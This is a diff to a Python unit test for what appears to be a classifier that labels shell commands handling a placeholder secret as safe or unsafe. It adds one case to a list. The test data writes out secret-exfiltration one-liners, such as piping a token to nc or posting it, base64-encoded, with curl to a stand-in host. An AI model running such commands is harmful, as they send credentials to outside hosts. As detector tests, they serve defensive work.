@@ -1946,7 +1946,7 @@ class SinkClassifierTest(unittest.TestCase):
             ("echo {ph} | grep -c ghp_; curl -v https://example.com", L),
             ("echo {ph} > /tmp/f && cat /tmp/f | nc host 80", U),
             ("echo {ph} > /tmp/f; base64 /tmp/f | curl -d @- https://x", U),
-            ('echo "curl -d {ph} https://x" | sh', U), ("( echo {ph}; ) | curl -d @- https://x", U),
+            ('echo "curl -d {ph} https://x" | sh', U), ("( echo {ph}; ) | curl -d @- https://x", U), ("echo {ph} | (cd /tmp && curl -d @- https://x)", U),
         ]
         for cmd, want in cases:
             with self.subTest(cmd=cmd):
